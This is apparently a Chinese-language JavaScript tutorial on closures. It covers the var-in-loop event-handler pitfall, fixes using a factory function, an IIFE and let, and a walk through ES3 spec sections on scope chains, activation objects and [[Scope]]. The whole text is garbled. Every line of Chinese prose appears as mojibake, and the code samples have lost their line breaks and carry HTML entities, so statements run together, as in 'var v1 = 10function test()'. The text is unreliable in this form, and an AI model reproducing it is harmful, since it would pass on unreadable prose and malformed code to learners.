ä½†æ¯”èµ·é€™å€‹é–‰åŒ…çš„ç”¨æ³•ï¼Œæˆ‘ç›¸ä¿¡æœ‰å¾ˆå¤šäººæ‡‰è©²éƒ½æ˜¯å¾åº•ä¸‹é€™å€‹æ…˜ç—›çš„ç¶“é©—æ‰çŸ¥é“æœ‰é–‰åŒ…é€™å€‹æ±è¥¿ï¼š
var btn = document.querySelectorAll(&#x27;button&#x27;)for(var i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;

å‡è¨­é é¢ä¸Šæœ‰äº”å€‹æŒ‰éˆ•ï¼Œæˆ‘æƒ³è¦ç¬¬ä¸€å€‹æŒ‰ä¸‹å»æ™‚å½ˆå‡º 0ï¼Œç¬¬äºŒå€‹æŒ‰ä¸‹å»æ™‚å½ˆå‡º 1ï¼Œä»¥æ­¤é¡æ¨ï¼Œæ–¼æ˜¯å¯«äº†ä¸Šé¢çš„ç¨‹å¼ç¢¼ï¼Œçœ‹èµ·ä¾†ååˆ†åˆç†ã€‚
èª°çŸ¥é“æˆ‘ä¸€é»ä¸‹å»æŒ‰éˆ•ï¼Œé è…°å‹’ç‚ºä»€éº¼æ¯ä¸€å€‹æŒ‰éˆ•éƒ½å½ˆå‡º 5ï¼Œéƒ½å½ˆå‡ºä¸€æ¨£çš„æ•¸å­—å°±å¤ è©­ç•°äº†ï¼Œ5 åˆ°åº•æ˜¯å¾å“ªä¾†çš„å•Šï¼Ÿ
åŒ…æ‹¬æˆ‘è‡ªå·±ä¹Ÿæ˜¯æœ‰é¡ä¼¼çš„ç¶“é©—æ‰æ„è­˜åˆ°è‡ªå·±å°ä½œç”¨åŸŸä»¥åŠé–‰åŒ…ä¸å¤ªç†Ÿæ‚‰ï¼Œç¾åœ¨æœ‰äº†ç¶“é©—ä¹‹å¾Œå†å›é ­ä¾†çœ‹ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼å°±èƒ½å¤ å®Œå…¨ç†è§£äº†ã€‚
é¦–å…ˆï¼Œä¸Šé¢çš„è¿´åœˆä½ ä»¥ç‚ºæ˜¯é€™æ¨£å­ï¼š
btn[0].addEventListener(&#x27;click&#x27;, function() &#123;  alert(0)&#125;)  btn[1].addEventListener(&#x27;click&#x27;, function() &#123;  alert(1)&#125;)  ...

ä½†å…¶å¯¦æ˜¯é€™æ¨£å­ï¼š
btn[0].addEventListener(&#x27;click&#x27;, function() &#123;  alert(i)&#125;)  btn[1].addEventListener(&#x27;click&#x27;, function() &#123;  alert(i)&#125;)  ...

ä»”ç´°æƒ³æƒ³ä½ æœƒç™¼ç¾ä¸‹é¢æ¯”è¼ƒåˆç†ï¼Œæˆ‘æœ¬ä¾†å°±æ˜¯å¹«å®ƒåŠ ä¸€å€‹ function æ˜¯æŒ‰ä¸‹å»çš„æ™‚å€™æœƒè·³å‡º i è€Œå·²ï¼Œæˆ‘åˆæ²’æœ‰ç›´æ¥åŸ·è¡Œé€™å€‹ functionã€‚
æ‰€ä»¥ç•¶ä½¿ç”¨è€…æŒ‰æŒ‰éˆ•çš„æ™‚å€™ï¼Œç•«é¢å°±æœƒè·³å‡º iï¼Œé‚£é€™å€‹ i çš„å€¼æœƒæ˜¯ä»€éº¼ï¼Ÿå› ç‚ºä½ æŒ‰æŒ‰éˆ•çš„æ™‚å€™è¿´åœˆå·²ç¶“è·‘å®Œäº†ï¼Œæ‰€ä»¥ i æ—©å·²è®Šæˆ 5ï¼ˆè¿´åœˆçš„æœ€å¾Œä¸€åœˆï¼Œi åŠ ä¸€è®Šæˆ 5ï¼Œåˆ¤æ–·ä¸ç¬¦åˆ i&lt;&#x3D;4 é€™å€‹æ¢ä»¶æ‰€ä»¥è·³å‡ºè¿´åœˆï¼‰ï¼Œç•«é¢ä¹Ÿå°±è·³å‡ºæ•¸å­— 5 äº†ã€‚
æˆ‘åŠ ä¸Šçš„é€™å¹¾å€‹ functionï¼Œæœ¬èº«éƒ½æ²’æœ‰ i é€™å€‹è®Šæ•¸ï¼Œæ‰€ä»¥å¾€ä½œç”¨åŸŸçš„å¤–å±¤å»å°‹æ‰¾ï¼Œå°±æ‰¾åˆ°ä¸Šé¢è¿´åœˆçš„é‚£å€‹è®Šæ•¸ i äº†ï¼Œå› æ­¤é€™å¹¾å€‹ function æ‰€æŒ‡æ¶‰åˆ°çš„ i æ˜¯åŒä¸€å€‹ iã€‚
é‚£æ‡‰è©²æ€éº¼è§£æ±ºé€™å€‹å•é¡Œå‘¢ï¼ŸåŠ ä¸Š functionï¼
function getAlert(num) &#123;  return function() &#123;    alert(num)  &#125;&#125;for(var i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, getAlert(i))&#125;

é€™é‚Šè¦æ³¨æ„çš„æ˜¯ getAlert(i) æœƒã€Œå›å‚³ã€ä¸€å€‹è·³å‡º i çš„ functionï¼Œå› æ­¤æˆ‘é¡å¤–ç”¢ç”Ÿäº†äº”å€‹æ–°çš„ functionï¼Œæ¯ä¸€å€‹ function è£¡é¢éƒ½æœ‰è‡ªå·±è©²è·³å‡ºçš„å€¼ã€‚
æˆ–æ˜¯ä½ è¦è€å¸¥çš„è©±å°±é€™æ¨£å¯«ï¼š
for(var i=0; i&lt;=4; i++) &#123;  (function(num) &#123;    btn[i].addEventListener(&#x27;click&#x27;, function() &#123;      alert(num)    &#125;)  &#125;)(i)&#125;

åˆ©ç”¨ IIFEï¼ˆImmediately Invoked Function Expressionï¼‰æŠŠä¸€å€‹ function åŒ…èµ·ä¾†ä¸¦å‚³å…¥ i ç«‹å³åŸ·è¡Œï¼Œæ‰€ä»¥è¿´åœˆæ¯è·‘ä¸€åœˆå…¶å¯¦å°±æœƒç«‹åˆ»å‘¼å«ä¸€å€‹æ–°çš„ functionï¼Œå› æ­¤å°±ç”¢ç”Ÿäº†æ–°çš„ä½œç”¨åŸŸã€‚
ä»¥ä¸Šå¦‚æœä½ éƒ½è¦ºå¾—å¤ªéº»ç…©ä¸æƒ³ç”¨ï¼Œæ­å–œï¼Œåœ¨ ES6 è£¡é¢æœ‰äº† block scope ä»¥å¾Œï¼Œä½ åªè¦ç°¡å–®åœ°æŠŠè¿´åœˆè£¡é¢ç”¨çš„ var æ”¹æˆ let å°±è¡Œäº†ï¼š
for(let i=0; i&lt;=4; i++) &#123;  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;

å› ç‚º let çš„ç‰¹æ€§ï¼Œæ‰€ä»¥å…¶å¯¦è¿´åœˆæ¯è·‘ä¸€åœˆéƒ½æœƒç”¢ç”Ÿä¸€å€‹æ–°çš„ä½œç”¨åŸŸï¼Œå› æ­¤ alert å‡ºä¾†çš„å€¼å°±æœƒæ˜¯ä½ æƒ³è¦çš„é‚£å€‹å€¼ã€‚å¦‚æœä½ é‚„æ˜¯è¦ºå¾—æœ‰é»ç–‘æƒ‘ï¼Œä½ å¯ä»¥æŠŠè¿´åœˆçœ‹æˆé€™æ¨£ï¼š
&#123; // å¡Šç´šä½œç”¨åŸŸ  let i=0  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;&#123; // å¡Šç´šä½œç”¨åŸŸ  let i=1  btn[i].addEventListener(&#x27;click&#x27;, function() &#123;    alert(i)  &#125;)&#125;...

èªªåˆ°é€™é‚Šæˆ‘å€‘å°é–‰åŒ…æœ‰äº†åˆæ­¥çš„ç†è§£ï¼Œä½†å°æ–¼ã€Œä»€éº¼æ˜¯é–‰åŒ…ã€é€™å€‹å•é¡Œä¼¼ä¹é‚„æ²’æœ‰ä¸€å€‹æ˜ç¢ºçš„å®šç¾©ï¼Œã€Œé–‰åŒ…å°±æ˜¯å¯ä»¥æŠŠå€¼é—œåœ¨è£¡é¢çš„ functionã€è½èµ·ä¾†æ€ªæ€ªçš„ï¼Œå¦‚æœä½ å»æ‰¾ç¶­åŸºç™¾ç§‘ï¼Œä»–æœƒè·Ÿä½ èªªï¼š

åœ¨é›»è…¦ç§‘å­¸ä¸­ï¼Œé–‰åŒ…ï¼ˆè‹±èªï¼šClosureï¼‰ï¼Œåˆç¨±è©æ³•é–‰åŒ…ï¼ˆLexical Closureï¼‰æˆ–å‡½å¼é–‰åŒ…ï¼ˆfunction closuresï¼‰ï¼Œæ˜¯åƒç…§äº†è‡ªç”±è®Šæ•¸çš„å‡½å¼ã€‚é€™å€‹è¢«åƒç…§çš„è‡ªç”±è®Šæ•¸å°‡å’Œé€™å€‹å‡½å¼ä¸€åŒå­˜åœ¨ï¼Œå³ä½¿å·²ç¶“é›¢é–‹äº†å‰µé€ å®ƒçš„ç’°å¢ƒä¹Ÿä¸ä¾‹å¤–ã€‚æ‰€ä»¥ï¼Œæœ‰å¦ä¸€ç¨®èªªæ³•èªç‚ºé–‰åŒ…æ˜¯ç”±å‡½å¼å’Œèˆ‡å…¶ç›¸é—œçš„åƒç…§ç’°å¢ƒçµ„åˆè€Œæˆçš„å¯¦é«”ã€‚

å¦‚æœå»æ‰¾è‹±æ–‡çš„ç¶­åŸºç™¾ç§‘ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå¯«è‘—ï¼š

Operationally, a closure is a record storing a function together with an environment

å¥½ï¼Œçœ‹èµ·ä¾†é‚„æ˜¯æœ‰é»éœ§ç…ç…ï¼Œä½†ç¸½ä¹‹å°æ–¼é–‰åŒ…çš„å®šç¾©å…ˆåœ¨æ­¤æ‰“ä½ï¼Œå¤§å®¶å¿ƒä¸­æœ‰å€‹æ¨¡ç³Šçš„æ¦‚å¿µå°±å¥½ï¼Œæˆ‘å€‘æ™šé»å†å›ä¾†è™•ç†ã€‚
åœ¨é€™å€‹æ®µè½æˆ‘å€‘çŸ¥é“äº†é–‰åŒ…å¯ä»¥å¯¦éš›æ‡‰ç”¨åœ¨å“ªè£¡ï¼Œä¹Ÿç†è§£äº†é–‰åŒ…å¯ä»¥å­˜å–åˆ°æ‡‰è©²è¢«é‡‹æ”¾çš„å€¼ï¼ˆä½†å»å› ç‚ºé–‰åŒ…çš„å­˜åœ¨ç„¡æ³•è¢«é‡‹æ”¾ï¼‰ï¼Œå†ä¾†æˆ‘å€‘ä¾†çœ‹çœ‹ ECMAScript æ˜¯å¦‚ä½•è¬›è¿°ä½œç”¨åŸŸçš„ã€‚
ECMAScript ä¸­çš„ä½œç”¨åŸŸåœ¨é–‹å§‹ä¹‹å‰ï¼Œå¦‚æœä½ å¿˜è¨˜æˆ‘å€‘ä¹‹å‰è¬›çš„é‹ä½œæ¨¡å‹ï¼Œè«‹å›å»æˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿè¤‡ç¿’ä¸€ä¸‹ï¼Œå› ç‚ºæˆ‘å€‘ç­‰ç­‰æœƒç”¨åˆ°ã€‚
åœ¨é€™é‚Šæˆ‘ä¸€æ¨£ç”¨ç¯‡å¹…è¼ƒå°‘çš„ ES3 ä¾†ç•¶ç¯„ä¾‹ï¼Œè¦æ³¨æ„çš„æ˜¯ ES6 ä»¥å¾Œå¾ˆå¤šåè©è®Šå¾—ä¸ä¸€æ¨£äº†ï¼Œä½†åŸç†å¤§è‡´ä¸Šæ˜¯ç›¸é€šçš„ã€‚
ä¸Šæ¬¡æˆ‘å€‘åœ¨10.1.3 Variable Instantiationçš„ç« ç¯€çœ‹åˆ°äº† hoisting ç›¸é—œçš„æ±è¥¿ï¼Œé€™æ¬¡æˆ‘å€‘è¦çœ‹çš„å‰‡æ˜¯ä¸‹ä¸€å€‹æ®µè½è€Œå·²ï¼Œä¹Ÿå°±æ˜¯10.1.4 Scope Chain and Identifier Resolutionã€‚

Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. When control enters an execution context, a scope chain is created and populated with an initial set of objects, depending on the type of code.

æ¯å€‹ EC éƒ½æœ‰è‡ªå·±çš„ scope chainï¼Œç•¶é€²å…¥ EC çš„æ™‚å€™ scope chain æœƒè¢«å»ºç«‹ã€‚
æ¥è‘—æˆ‘å€‘ä¾†çœ‹10.2 Entering An Execution Contextåº•ä¸‹çš„10.2.3 Function Codeï¼š

The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object.

é€™ä¸€æ®µæè¿°äº† scope chain çš„å…§å®¹åˆ°åº•æ˜¯ä»€éº¼ï¼Œå®ƒè¬›èªªç•¶é€²å…¥ EC çš„æ™‚å€™ï¼Œscope chain æœƒè¢«åˆå§‹åŒ–ç‚º activation object ä¸¦åŠ ä¸Š function çš„[[Scope]]é€™å€‹å±¬æ€§ã€‚
ä»¥ä¸Šæ®µè½å…¶å¯¦è¦è¬›çš„äº‹æƒ…åªæœ‰ä¸€å€‹ï¼Œå°±æ˜¯åœ¨é€²å…¥ EC çš„æ™‚å€™æœƒåšä¸‹é¢é€™ä»¶äº‹ï¼š
scope chain = activation object + [[Scope]]

æ¥è‘—è¦è™•ç†çš„æ˜¯å…©å€‹å•é¡Œï¼šä»€éº¼æ˜¯ activation objectï¼ˆä»¥ä¸‹ç°¡ç¨± AOï¼‰ï¼Œä»€éº¼åˆæ˜¯[[Scope]]ï¼Ÿ
åœ¨10.1.6 Activation Objectå¯ä»¥æ‰¾åˆ° AO çš„è§£é‡‹ï¼š

When control enters an execution context for function code, an object called the activation object is created and associated with the execution context.
The activation object is initialised with a property with name arguments and attributes { DontDelete }
The activation object is then used as the variable object for the purposes of variable instantiation.

é€™é‚Šæåˆ°When control enters an execution context for function codeï¼Œæ„æ€å°±æ˜¯åªæœ‰åœ¨é€²å…¥ã€Œå‡½å¼ã€çš„æ™‚å€™æœƒç”¢ç”Ÿé€™å€‹ AOï¼Œè€Œä¹‹å¾Œ AO ä¾¿è¢«ç•¶ä½œ VO æ‹¿å»ä½¿ç”¨ã€‚
æ‰€ä»¥ä»€éº¼æ˜¯ AOï¼Ÿä½ å¯ä»¥æŠŠå®ƒç›´æ¥ç•¶ä½œ VO çš„å¦å¤–ä¸€ç¨®ç‰¹åˆ¥çš„å‹æ…‹ï¼Œåªåœ¨ function çš„ EC ä¸­å‡ºç¾ï¼Œæ‰€ä»¥åœ¨ global çš„æ™‚å€™æˆ‘å€‘æœ‰ VOï¼Œåœ¨ function å…§çš„æ™‚å€™æˆ‘å€‘æœ‰ AOï¼Œä½†æ˜¯åšçš„äº‹æƒ…éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œé‚£å°±æ˜¯æœƒæŠŠä¸€äº›ç›¸é—œçš„è³‡è¨Šæ”¾åœ¨è£¡é¢ã€‚
å·®åˆ¥åœ¨å“ªè£¡ï¼Ÿå·®åˆ¥åœ¨æ–¼ AO è£¡é¢æœƒæœ‰ä¸€å€‹argumentsï¼Œç•¢ç«Ÿæ˜¯çµ¦ function ç”¨çš„å˜›ï¼Œä¸€å®šè¦å­˜é€™å€‹ï¼Œå…¶é¤˜åœ°æ–¹éƒ½æ˜¯å·®ä¸å¤šçš„ã€‚å¦‚æœä½ å·æ‡¶æŠŠ VO è·Ÿ AO é€™å…©å€‹è©æ··åœ¨ä¸€èµ·ä½¿ç”¨ï¼Œæˆ‘è¦ºå¾—ä¹Ÿæ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ç‚ºå·®åˆ¥çœŸçš„å¤ªç´°å¾®äº†ã€‚
è§£æ±ºäº† AO çš„å•é¡Œä¹‹å¾Œï¼Œé‚£ä»€éº¼æ˜¯[[Scope]]ï¼Ÿåœ¨13.2 Creating Function Objectsçš„éƒ¨åˆ†å¯ä»¥çœ‹åˆ°æ›´è©³ç´°çš„è§£é‡‹ï¼š

Given an optional parameter list specified by FormalParameterList, a body specified by FunctionBody, and a scope chain specified by Scope, a Function object is constructed as follows
ï¼ˆä¸­é–“çœç•¥ï¼‰
7.Set the [[Scope]] property of F to a new scope chain (10.1.4) that contains the same objects as Scope.

å°±æ˜¯èªªä½ åœ¨å»ºç«‹ function çš„æ™‚å€™æœƒçµ¦ä¸€å€‹ Scopeï¼Œè€Œé€™ä¸€å€‹ Scope æœƒè¢«è¨­å®šåˆ°[[Scope]]å»ã€‚
é‚£åœ¨å»ºç«‹ function æ™‚çµ¦çš„ Scope æ˜¯ä»€éº¼ï¼Ÿé‚„èƒ½æœ‰ä»€éº¼ï¼Œç•¶ç„¶å°±æ˜¯ç•¶å‰ EC çš„ Scopeã€‚
é€™æ¨£ä¸€æ®µæ®µçœ‹å®Œä¹‹å¾Œå…¶å¯¦æˆ‘å€‘å¯ä»¥æ•´ç†å‡ºé€™æ¨£çš„ä¸€å€‹æµç¨‹ï¼š

ç•¶ function A å»ºç«‹æ™‚ï¼Œè¨­ç½®A.[[Scope]] = scope chain of current EC
ç•¶é€²å…¥ä¸€å€‹ function A æ™‚ï¼Œç”¢ç”Ÿä¸€å€‹æ–°çš„ ECï¼Œä¸¦è¨­ç½®EC.scope_chain = AO + A.[[Scope]]

æƒ³è¦å®Œå…¨ææ¸…æ¥šï¼Œå°±è®“æˆ‘å€‘å¯¦éš›å†ä¾†è·‘ä¸€éé€™æ•´å€‹æµç¨‹å°±è¡Œäº†ï¼Œæˆ‘å€‘ç”¨ä¸‹é¢é€™å€‹éå¸¸ç°¡å–®çš„ç¨‹å¼ç¢¼ä½œç‚ºç¯„ä¾‹ï¼š
var v1 = 10function test() &#123;  var vTest = 20  function inner() &#123;    console.log(v1, vTest) //10 20  &#125;  return inner&#125;var inner = test()inner()

ç¬¬ä¸€æ­¥ï¼šé€²å…¥ Global ECç¾åœ¨é€²å…¥ Global EC ä¸¦ä¸”åˆå§‹åŒ– VO ä»¥åŠ scope chainï¼Œå‰é¢æœ‰è¬›éscope chain = activation object + [[Scope]]ï¼Œä½†å› ç‚ºé€™ä¸æ˜¯ä¸€å€‹ function æ‰€ä»¥æ²’æœ‰[[Scope]]ï¼Œè€Œæ²’æœ‰ AO å°±ç›´æ¥æ‹¿ VO ä¾†ç”¨ã€‚ç¸½ä¹‹ï¼Œæœ€å¾Œ Global EC æœƒæ˜¯é€™æ¨£ï¼š
globalEC = &#123;  VO: &#123;   v1: undefined,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;

VO çš„éƒ¨åˆ†å°±æŒ‰ç…§ä¹‹å‰è¬›éçš„åˆå§‹åŒ–ï¼Œç¾åœ¨å”¯ä¸€å¤šçš„æ­¥é©Ÿæ˜¯å¤šå‡ºäº† scopeChain é€™å€‹å±¬æ€§ï¼Œè€ŒæŒ‰ç…§å®šç¾©ï¼Œscope chain å°±æ˜¯ globalEC è‡ªå·±çš„ VO&#x2F;AOã€‚
é€™é‚Šåˆ¥å¿˜äº†é‚„æœ‰æœ€å¾Œä¸€æ­¥ï¼Œé‚£å°±æ˜¯è¦è¨­ç½® function çš„[[Scope]]ï¼Œæ‰€ä»¥ test é€™å€‹ function çš„[[Scope]]å°±æœƒæ˜¯globalEC.scopeChainä¹Ÿå°±æ˜¯globalEC.VOã€‚
ç¬¬äºŒæ­¥ï¼šåŸ·è¡Œç¨‹å¼ç¢¼å†ä¾†ç¬¬äºŒæ­¥åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œè·‘äº†var v1 = 10ä¹‹å¾Œç¢°åˆ°var inner = test()ï¼Œé€™é‚Šè¦æº–å‚™é€²å…¥åˆ° test çš„ EC äº†ï¼Œåœ¨é€²å…¥å‰æˆ‘å€‘ç¾åœ¨çš„è³‡è¨Šé•·é€™æ¨£ï¼š
globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  test.[[Scope]] = globalEC.scopeChain

ç¬¬ä¸‰æ­¥ï¼šé€²å…¥ test ECæŒ‰ç…§æ…£ä¾‹ï¼Œé€²å…¥çš„æ™‚å€™å…ˆæŠŠ test EC è·Ÿ AO å»ºç«‹èµ·ä¾†ï¼Œç„¶å¾Œè¨˜å¾—scope chain = activation object + [[Scope]]
testEC = &#123;  AO: &#123;    arguments,    vTest: undefined,    inner: function  &#125;,  scopeChain:   	[testEC.AO, test.[[Scope]]]  = [testEC.AO, globalEC.scopeChain]  = [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  test.[[Scope]] = globalEC.scopeChain

å¯ä»¥çœ‹åˆ°çš„æ˜¯ testEC çš„ scope chain å°±æ˜¯è‡ªå·±çš„ AO åŠ ä¸Šä¹‹å‰è¨­ç½®éçš„[[Scope]]ï¼Œç„¶å¾Œèªªç©¿äº†ï¼Œå…¶å¯¦ scope chain å°±æ˜¯ä¸Šå±¤çš„ EC çš„ VO å˜›ï¼åªæ˜¯æˆ‘å€‘ç”¨äº†æ¯”è¼ƒè¤‡é›œçš„ç¨‹åºå»è¨­ç½®é€™ä»¶äº‹æƒ…ï¼Œä½†æœ¬è³ªä¸Šå…¶å¯¦å°±æ˜¯ VO&#x2F;AO çš„çµ„åˆã€‚
æœ€å¾Œåˆ¥å¿˜è¨˜è¨­ç½® inner çš„ scopeï¼Œinner.[[Scope]] = testEC.scopeChainã€‚
ç¬¬å››æ­¥ï¼šåŸ·è¡Œ test ä¸­çš„ç¨‹å¼ç¢¼å…¶å¯¦ä¹Ÿå°±åªè·‘äº†var vTest = 20è·Ÿreturn innerï¼ŒåŸ·è¡Œå®Œä»¥å¾Œè®Šæˆé€™æ¨£ï¼š
testEC = &#123;  AO: &#123;    arguments,    vTest: 20,    inner: function  &#125;,  scopeChain: [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO]

æ¥è‘—æŠŠ inner å›å‚³å›å»ï¼Œè€Œtesté€™å€‹ function å°±çµæŸäº†ï¼Œç…§ç†ä¾†èªªè³‡æºæ‡‰è©²è¦è¢«é‡‹æ”¾æ‰å°ã€‚
å¯æ˜¯ï¼ä½ æœ‰æ²’æœ‰ç™¼ç¾ç¾åœ¨inner.[[Scope]]è¨˜è‘—testEC.AOï¼Ÿå› ç‚ºæœ‰äººé‚„éœ€è¦å®ƒï¼Œæ‰€ä»¥å®ƒæ²’è¾¦æ³•å°±é€™æ¨£è¢«é‡‹æ”¾ï¼Œåƒ…ç®¡ test çµæŸäº†ï¼ŒtestEC.AO é‚„æ˜¯å­˜åœ¨æ–¼è¨˜æ†¶é«”è£¡é¢ã€‚
ç¬¬äº”æ­¥ï¼šé€²å…¥ inner ECé€™é‚Šå°±ä¸è´…è¿°äº†ï¼Œå°±æŒ‰ç…§åŒæ¨£çš„åŸå‰‡å»åšåˆå§‹åŒ–ï¼š
innerEC = &#123;  AO: &#123;    arguments  &#125;,  scopeChain:  [innerEC.AO, inner.[[Scope]]]= [innerEC.AO, testEC.scopeChain]= [innerEC.AO, testEC.AO, globalEC.VO]&#125;  testEC = &#123;  AO: &#123;    arguments,    vTest: 20,    inner: function  &#125;,  scopeChain: [testEC.AO, globalEC.VO]&#125;  globalEC = &#123;  VO: &#123;   v1: 10,   inner: undefined,   test: function   &#125;,  scopeChain: globalEC.VO&#125;  inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO]

æœ‰æ²’æœ‰ç™¼ç¾å°±è·Ÿæˆ‘å‰›æ‰è¬›çš„ä¸€æ¨£ï¼Œå…¶å¯¦ scope chain èªªç©¿äº†å°±æ˜¯ VO&#x2F;AO çš„çµ„åˆè€Œå·²ã€‚
ç¬¬å…­æ­¥ï¼šåŸ·è¡Œ innerå¾ scope chain è£¡é¢å°‹æ‰¾ v1 è·Ÿ vTest é€™å…©å€‹è®Šæ•¸ï¼Œåœ¨è‡ªå·±çš„ AO è£¡é¢æ‰¾ä¸åˆ°æ‰€ä»¥å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ° testEC.AO ä¸¦å°‹ç² vTestï¼Œä½† v1 é‚„æ˜¯æ²’æ‰¾åˆ°æ‰€ä»¥åˆå¾€ä¸Šä¸€å±¤å»çœ‹ globalEC.VOï¼Œæœ€å¾Œæ‰¾åˆ° v1ï¼ŒæˆåŠŸç²å¾—é€™å…©å€‹è®Šæ•¸çš„å€¼ä¸¦å°å‡ºã€‚
çµæŸã€‚
ä¸Šé¢çš„æµç¨‹è¬›å¾—è¼ƒç‚ºè©³ç´°ï¼Œå¯ä»¥è‡ªå·±å†é–‹å€‹å°è¦–çª—åœ¨æ—é‚Šæ­é…è‘—ç¨‹å¼ç¢¼ä¸€èµ·çœ‹ï¼Œä¸€æ­¥æ­¥ä¾†çœ‹ç›¸ä¿¡æœƒæ¯”è¼ƒå®¹æ˜“ç†è§£ã€‚å…¶å¯¦åœ¨ä¸Šæ¬¡è¨è«– hoisting çš„æ™‚å€™å°±å·²ç¶“è¬›éé€™å€‹æ¨¡å‹äº†ï¼Œè€Œä»Šå¤©åªæ˜¯è£œå……ä¸Šæ¬¡æ²’è¬›åˆ°çš„éƒ¨åˆ†ï¼Œé‚£å°±æ˜¯ scope chainï¼ŒåŠ ä¸Šå»ä¹‹å¾Œé€™å€‹æ¨¡å‹å°±å®Œæ•´è¨±å¤šï¼Œä¸ä½†èƒ½è§£é‡‹ hoistingï¼Œä¹Ÿèƒ½è§£é‡‹ç‚ºä»€éº¼ function åŸ·è¡ŒçµæŸä»¥å¾Œé‚„å¯ä»¥å­˜å–çš„åˆ°é‚£äº›è®Šæ•¸ã€‚
å› ç‚ºé‚£äº›è®Šæ•¸è¢«ç•™åœ¨ innerEC çš„ scope chain è£¡é¢ï¼Œæ‰€ä»¥ä¸æœƒä¹Ÿä¸èƒ½è¢« GC å›æ”¶æ‰ï¼Œæ‰æœƒç™¼ç”Ÿé€™ç¨®ç¾è±¡ã€‚
è€Œç†è§£äº† scope chain å…¶å¯¦åªæ˜¯ VO&#x2F;AO çš„çµ„åˆä»¥å¾Œï¼Œä¹Ÿèƒ½å¾ˆè¼•æ˜“åœ°å°±çŸ¥é“æˆ‘å€‘é–‹é ­æ‰€èªªçš„ã€Œåœ¨ scope chain å¾€ä¸Šæ‰¾ã€æ˜¯ä»€éº¼æ„æ€ï¼Œå°±æ˜¯å¾€ä¸Šä¸€å±¤å»çœ‹æœ‰æ²’æœ‰é€™å€‹è®Šæ•¸å˜›ï¼Œå› ç‚ºæœ‰çš„è©±ä¸€å®šæœƒå­˜åœ¨ VO&#x2F;AO è£¡é¢ã€‚
æœ€å¾Œï¼Œä¸Šé¢é€™å€‹æ¨¡å‹é‚„æœ‰ä¸€ä»¶äº‹æƒ…è¦æ³¨æ„ï¼Œé‚£å°±æ˜¯ç„¡è«–æˆ‘æœ‰æ²’æœ‰æŠŠå…§éƒ¨çš„ function çµ¦å›å‚³ï¼ˆä»¥ä¸Šé¢é€™å€‹ä¾‹å­å°±æ˜¯ innerï¼‰ï¼Œéƒ½ä¸å½±éŸ¿é€™å€‹æ©Ÿåˆ¶çš„é‹è¡Œã€‚
æ„æ€æ˜¯èªªå„˜ç®¡æˆ‘çš„ç¨‹å¼ç¢¼é•·é€™æ¨£ï¼š
var v1 = 10function test() &#123;  var vTest = 20  function inner() &#123;    console.log(v1, vTest) //10 20  &#125;  inner() // ä¸å›å‚³ç›´æ¥åŸ·è¡Œ&#125;test()

ä»–æœ€å¾Œå‡ºä¾†çš„æ¨¡å‹è·Ÿå‰›å‰›çš„ç¨‹å¼ç¢¼æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œinner éƒ½æœ‰ä¸€æ¨£çš„ scope chainï¼Œä¸¦ä¸”ä¸€æ¨£å­˜è‘— test è·Ÿ global EC çš„ VO&#x2F;AOã€‚
ä½ æœ‰æ³¨æ„åˆ°æˆ‘å€‘æ­£ä¸€æ­¥æ­¥é‚å‘æˆ‘å€‘çš„æ¨™é¡Œå—ï¼Ÿ
æ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…æˆ‘å€‘å†å›ä¾†çœ‹ wiki ä¸Šé¢å°é–‰åŒ…çš„å®šç¾©ï¼š

åœ¨é›»è…¦ç§‘å­¸ä¸­ï¼Œé–‰åŒ…ï¼ˆè‹±èªï¼šClosureï¼‰ï¼Œåˆç¨±è©æ³•é–‰åŒ…ï¼ˆLexical Closureï¼‰æˆ–å‡½å¼é–‰åŒ…ï¼ˆfunction closuresï¼‰ï¼Œæ˜¯åƒç…§äº†è‡ªç”±è®Šæ•¸çš„å‡½å¼ã€‚é€™å€‹è¢«åƒç…§çš„è‡ªç”±è®Šæ•¸å°‡å’Œé€™å€‹å‡½å¼ä¸€åŒå­˜åœ¨ï¼Œå³ä½¿å·²ç¶“é›¢é–‹äº†å‰µé€ å®ƒçš„ç’°å¢ƒä¹Ÿä¸ä¾‹å¤–ã€‚æ‰€ä»¥ï¼Œæœ‰å¦ä¸€ç¨®èªªæ³•èªç‚ºé–‰åŒ…æ˜¯ç”±å‡½å¼å’Œèˆ‡å…¶ç›¸é—œçš„åƒç…§ç’°å¢ƒçµ„åˆè€Œæˆçš„å¯¦é«”ã€‚

